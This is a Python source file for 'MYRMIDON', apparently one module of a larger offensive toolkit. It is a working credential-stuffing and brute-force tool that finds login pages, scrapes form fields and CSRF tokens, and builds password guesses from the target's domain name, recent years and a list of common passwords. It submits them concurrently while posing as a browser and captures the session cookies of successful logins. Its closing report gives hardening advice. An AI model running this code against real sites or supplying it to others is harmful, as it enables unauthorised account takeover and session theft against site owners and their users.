#!/usr/bin/env python3
"""
MYRMIDON - Credential Stuffing & Authentication Testing
Advanced authentication testing with intelligent credential generation and session hijacking.
"""

import asyncio
import aiohttp
import json
import re
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from urllib.parse import urljoin, urlparse
import random
from datetime import datetime

@dataclass
class AuthEndpoint:
    url: str
    method: str = "POST"
    parameters: Dict[str, str] = field(default_factory=dict)
    csrf_token: Optional[str] = None
    csrf_param: Optional[str] = None
    content_type: str = "application/x-www-form-urlencoded"

@dataclass
class CredentialPair:
    username: str
    password: str
    source: str = "generated"
    tested: bool = False
    valid: bool = False

@dataclass
class AuthResult:
    endpoint: str
    credential: CredentialPair
    status_code: int
    response_time: float
    session_cookie: Optional[str] = None
    error: Optional[str] = None

class Myrmidon:
    def __init__(self, target_url: str, knowledge_graph=None):
        self.target_url = target_url
        self.kg = knowledge_graph
        self.auth_endpoints: List[AuthEndpoint] = []
        self.credentials: List[CredentialPair] = []
        self.results: List[AuthResult] = []
        self.session = None
        self.common_passwords = self._load_common_passwords()
        
    def _load_common_passwords(self) -> List[str]:
        """Load common passwords for testing."""
        return [
            'password', '123456', 'password123', 'admin', 'welcome',
            '12345678', 'qwerty', '123456789', '12345', '1234',
            '111111', '1234567', 'dragon', '123123', 'baseball',
            'abc123', 'football', 'monkey', 'letmein', 'shadow',
            'master', '666666', 'qwertyuiop', '123321', 'mustang',
            '1234567890', 'michael', '654321', 'superman', '1qaz2wsx',
            '7777777', '121212', '000000', 'qazwsx', '123qwe',
            'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm',
            'asdfgh', 'hunter', 'buster', 'soccer', 'harley',
            'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou',
            '2000', 'charlie', 'robert', 'thomas', 'hockey',
            'ranger', 'daniel', 'starwars', 'klaster', '112233',
            'george', 'computer', 'michelle', 'jessica', 'pepper',
            '1111', 'zxcvbn', '555555', '11111111', '131313',
            'freedom', '777777', 'pass', 'maggie', '159753',
            'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese',
            'amanda', 'summer', 'love', 'ashley', 'nicole',
            'chelsea', 'biteme', 'matthew', 'access', 'yankees',
            '987654321', 'dallas', 'austin', 'thunder', 'taylor',
            'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring',
            'montana', 'moon', 'moscow'
        ]
    
    async def discover_auth_endpoints(self) -> List[AuthEndpoint]:
        """Discover authentication endpoints on the target."""
        endpoints = []
        
        common_auth_paths = [
            '/login', '/signin', '/auth', '/authenticate',
            '/admin/login', '/wp-login.php', '/administrator',
            '/api/auth', '/api/login', '/oauth/token',
            '/signup', '/register', '/join'
        ]
        
        async with aiohttp.ClientSession() as session:
            for path in common_auth_paths:
                url = urljoin(self.target_url, path)
                
                try:
                    async with session.get(url, timeout=10, allow_redirects=True) as resp:
                        # Check if it's a login page
                        if resp.status in [200, 401, 403]:
                            html = await resp.text()
                            
                            # Look for login forms
                            if self._is_login_form(html):
                                endpoint = AuthEndpoint(url=url)
                                
                                # Extract form parameters
                                endpoint = self._extract_form_params(html, endpoint)
                                
                                # Look for CSRF tokens
                                endpoint = self._find_csrf_token(html, endpoint)
                                
                                endpoints.append(endpoint)
                                
                except Exception as e:
                    print(f"Error checking {url}: {e}")
        
        self.auth_endpoints = endpoints
        return endpoints
    
    def _is_login_form(self, html: str) -> bool:
        """Check if HTML contains a login form."""
        login_indicators = [
            r'type=["\']password["\']',
            r'name=["\']password["\']',
            r'id=["\']password["\']',
            r'<form.*login',
            r'<form.*signin',
            r'<form.*auth',
            r'log\s*in',
            r'sign\s*in',
            r'authenticate',
            r'username',
            r'user\s*name'
        ]
        
        for pattern in login_indicators:
            if re.search(pattern, html, re.IGNORECASE):
                return True
        
        return False
    
    def _extract_form_params(self, html: str, endpoint: AuthEndpoint) -> AuthEndpoint:
        """Extract form parameters from HTML."""
        # Find form element
        form_pattern = r'<form[^>]*>(.*?)</form>'
        form_match = re.search(form_pattern, html, re.DOTALL | re.IGNORECASE)
        
        if not form_match:
            return endpoint
        
        form_html = form_match.group(0)
        
        # Extract input fields
        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
        inputs = re.findall(input_pattern, form_html, re.IGNORECASE)
        
        for input_name in inputs:
            # Skip submit buttons
            if 'submit' in input_name.lower():
                continue
            
            # Set default values
            if 'user' in input_name.lower() or 'email' in input_name.lower():
                endpoint.parameters[input_name] = 'testuser@example.com'
            elif 'pass' in input_name.lower():
                endpoint.parameters[input_name] = 'testpassword123'
            else:
                endpoint.parameters[input_name] = 'test'
        
        # Extract form method
        method_pattern = r'method=["\']([^"\']+)["\']'
        method_match = re.search(method_pattern, form_html, re.IGNORECASE)
        if method_match:
            endpoint.method = method_match.group(1).upper()
        
        # Extract form action
        action_pattern = r'action=["\']([^"\']+)["\']'
        action_match = re.search(action_pattern, form_html, re.IGNORECASE)
        if action_match:
            action_url = action_match.group(1)
            if action_url:
                endpoint.url = urljoin(endpoint.url, action_url)
        
        return endpoint
    
    def _find_csrf_token(self, html: str, endpoint: AuthEndpoint) -> AuthEndpoint:
        """Find CSRF tokens in HTML."""
        csrf_patterns = [
            r'name=["\']csrf["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'csrf["\'][^>]*content=["\']([^"\']+)["\']',
            r'csrf-token["\'][^>]*content=["\']([^"\']+)["\']'
        ]
        
        for pattern in csrf_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                endpoint.csrf_token = match.group(1)
                
                # Find the parameter name
                name_pattern = r'name=["\']([^"\']+)["\'][^>]*value=["\']' + re.escape(match.group(1)) + r'["\']'
                name_match = re.search(name_pattern, html, re.IGNORECASE)
                if name_match:
                    endpoint.csrf_param = name_match.group(1)
                
                break
        
        return endpoint
    
    def generate_credentials(self, target_domain: str, limit: int = 100) -> List[CredentialPair]:
        """Generate intelligent credentials based on target information."""
        credentials = []
        
        # Extract company name from domain
        company_name = target_domain.split('.')[0]
        
        # Generate username variations
        username_variations = [
            'admin',
            'administrator',
            'root',
            'test',
            'user',
            'demo',
            company_name,
            f'admin@{company_name}',
            f'administrator@{company_name}',
            f'support@{company_name}',
            f'info@{company_name}',
        ]
        
        # Generate password variations
        password_variations = []
        
        # Company-based passwords
        password_variations.extend([
            company_name,
            f'{company_name}123',
            f'{company_name}@2024',
            f'{company_name}@123',
            f'@{company_name}123',
            f'Welcome@{company_name}',
            f'{company_name}@2025',
        ])
        
        # Common passwords
        password_variations.extend(self.common_passwords[:50])
        
        # Year variations
        current_year = datetime.now().year
        for year in range(current_year - 5, current_year + 2):
            password_variations.extend([
                f'{company_name}{year}',
                f'{company_name}@{year}',
                f'Admin{year}',
                f'Password{year}',
            ])
        
        # Generate credential pairs
        for username in username_variations[:10]:  # Limit usernames
            for password in password_variations[:10]:  # Limit passwords per username
                credentials.append(
                    CredentialPair(
                        username=username,
                        password=password,
                        source="generated"
                    )
                )
                
                if len(credentials) >= limit:
                    return credentials
        
        self.credentials = credentials
        return credentials
    
    async def test_credential(self, 
                             endpoint: AuthEndpoint, 
                             credential: CredentialPair) -> AuthResult:
        """Test a single credential against an auth endpoint."""
        start_time = datetime.now()
        
        # Prepare request data
        data = endpoint.parameters.copy()
        
        # Replace placeholder values with actual credentials
        for param_name in data.keys():
            if 'user' in param_name.lower() or 'email' in param_name.lower() or 'login' in param_name.lower():
                data[param_name] = credential.username
            elif 'pass' in param_name.lower():
                data[param_name] = credential.password
        
        # Add CSRF token if found
        if endpoint.csrf_token and endpoint.csrf_param:
            data[endpoint.csrf_param] = endpoint.csrf_token
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': endpoint.content_type,
            'Origin': self.target_url,
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                if endpoint.method == "POST":
                    async with session.post(
                        endpoint.url,
                        data=data,
                        headers=headers,
                        timeout=30,
                        allow_redirects=True
                    ) as resp:
                        
                        response_time = (datetime.now() - start_time).total_seconds()
                        
                        # Check for successful authentication indicators
                        success = self._check_auth_success(resp, credential)
                        
                        # Extract session cookie if present
                        session_cookie = None
                        if 'set-cookie' in resp.headers:
                            session_cookie = resp.headers['set-cookie'].split(';')[0]
                        
                        result = AuthResult(
                            endpoint=endpoint.url,
                            credential=credential,
                            status_code=resp.status,
                            response_time=response_time,
                            session_cookie=session_cookie
                        )
                        
                        credential.tested = True
                        credential.valid = success
                        
                        return result
                
                else:  # GET request
                    # Build URL with parameters
                    params = '&'.join([f'{k}={v}' for k, v in data.items()])
                    url = f"{endpoint.url}?{params}"
                    
                    async with session.get(
                        url,
                        headers=headers,
                        timeout=30,
                        allow_redirects=True
                    ) as resp:
                        
                        response_time = (datetime.now() - start_time).total_seconds()
                        
                        success = self._check_auth_success(resp, credential)
                        
                        result = AuthResult(
                            endpoint=url,
                            credential=credential,
                            status_code=resp.status,
                            response_time=response_time
                        )
                        
                        credential.tested = True
                        credential.valid = success
                        
                        return result
        
        except Exception as e:
            response_time = (datetime.now() - start_time).total_seconds()
            return AuthResult(
                endpoint=endpoint.url,
                credential=credential,
                status_code=0,
                response_time=response_time,
                error=str(e)
            )
    
    def _check_auth_success(self, response, credential: CredentialPair) -> bool:
        """Check if authentication was successful."""
        status = response.status
        
        # Status code based indicators
        if status == 200:
            # Check response content for success indicators
            text = response.text if hasattr(response, 'text') else ''
            
            success_indicators = [
                'welcome', 'dashboard', 'logout', 'my account',
                'success', 'logged in', 'authentication successful',
                f'welcome {credential.username}', 'profile',
                'account settings', 'member area'
            ]
            
            for indicator in success_indicators:
                if indicator.lower() in text.lower():
                    return True
        
        elif status in [301, 302, 303, 307, 308]:  # Redirects
            # Check redirect location
            location = response.headers.get('location', '').lower()
            
            if any(word in location for word in ['dashboard', 'home', 'account', 'profile', 'admin']):
                return True
        
        elif status == 403:
            # 403 might indicate successful auth but no permissions
            return False  # Usually not success
        
        return False
    
    async def brute_force_attack(self, 
                                endpoint: AuthEndpoint,
                                credentials: List[CredentialPair],
                                max_concurrent: int = 5) -> List[AuthResult]:
        """Perform brute force attack with rate limiting."""
        results = []
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def test_with_semaphore(credential: CredentialPair):
            async with semaphore:
                result = await self.test_credential(endpoint, credential)
                return result
        
        # Create tasks
        tasks = [test_with_semaphore(cred) for cred in credentials]
        
        # Run with progress
        completed = 0
        total = len(tasks)
        
        for future in asyncio.as_completed(tasks):
            result = await future
            results.append(result)
            
            completed += 1
            if completed % 10 == 0:
                print(f"Progress: {completed}/{total} ({completed/total*100:.1f}%)")
        
        self.results.extend(results)
        return results
    
    def analyze_results(self) -> Dict:
        """Analyze authentication test results."""
        valid_creds = [r for r in self.results if r.credential.valid]
        failed_creds = [r for r in self.results if not r.credential.valid and r.error is None]
        error_creds = [r for r in self.results if r.error]
        
        analysis = {
            'total_tested': len(self.results),
            'valid_credentials': len(valid_creds),
            'failed_attempts': len(failed_creds),
            'errors': len(error_creds),
            'success_rate': len(valid_creds) / len(self.results) * 100 if self.results else 0,
            'valid_credential_pairs': [
                {
                    'username': r.credential.username,
                    'password': r.credential.password,
                    'endpoint': r.endpoint,
                    'session_cookie': r.session_cookie
                }
                for r in valid_creds
            ]
        }
        
        return analysis
    
    def generate_report(self) -> str:
        """Generate authentication testing report."""
        analysis = self.analyze_results()
        
        report_lines = [
            "# Authentication Testing Report",
            f"Target: {self.target_url}",
            f"Test date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "\n## Summary",
            f"Total credentials tested: {analysis['total_tested']}",
            f"Valid credentials found: {analysis['valid_credentials']}",
            f"Success rate: {analysis['success_rate']:.2f}%",
            f"Failed attempts: {analysis['failed_attempts']}",
            f"Errors: {analysis['errors']}",
        ]
        
        if analysis['valid_credential_pairs']:
            report_lines.append("\n## Valid Credentials Found")
            for i, cred in enumerate(analysis['valid_credential_pairs'], 1):
                report_lines.append(f"\n{i}. Username: {cred['username']}")
                report_lines.append(f"   Password: {cred['password']}")
                report_lines.append(f"   Endpoint: {cred['endpoint']}")
                if cred['session_cookie']:
                    report_lines.append(f"   Session: {cred['session_cookie'][:50]}...")
        
        # Recommendations
        report_lines.append("\n## Recommendations")
        if analysis['valid_credentials'] > 0:
            report_lines.append("🔴 **CRITICAL**: Weak credentials found!")
            report_lines.append("   - Implement strong password policies")
            report_lines.append("   - Enable multi-factor authentication")
            report_lines.append("   - Implement account lockout mechanisms")
        else:
            report_lines.append("🟢 No weak credentials found in this test")
            report_lines.append("   - Consider implementing rate limiting")
            report_lines.append("   - Monitor for credential stuffing attacks")
        
        return "\n".join(report_lines)

# Example usage
async def main():
    myrmidon = Myrmidon("https://example.com")
    
    # Discover auth endpoints
    endpoints = await myrmidon.discover_auth_endpoints()
    print(f"Found {len(endpoints)} authentication endpoints")
    
    if endpoints:
        # Generate credentials
        credentials = myrmidon.generate_credentials("example.com", limit=50)
        print(f"Generated {len(credentials)} credentials")
        
        # Test against first endpoint
        endpoint = endpoints[0]
        print(f"Testing against: {endpoint.url}")
        
        # Run brute force attack
        results = await myrmidon.brute_force_attack(endpoint, credentials[:20], max_concurrent=3)
        
        # Analyze results
        analysis = myrmidon.analyze_results()
        print(f"Valid credentials found: {analysis['valid_credentials']}")
        
        # Generate report
        report = myrmidon.generate_report()
        print("\n" + report)

if __name__ == "__main__":
    asyncio.run(main())


# Backwards compatibility: core imports `AuthAssassin`
AuthAssassin = Myrmidon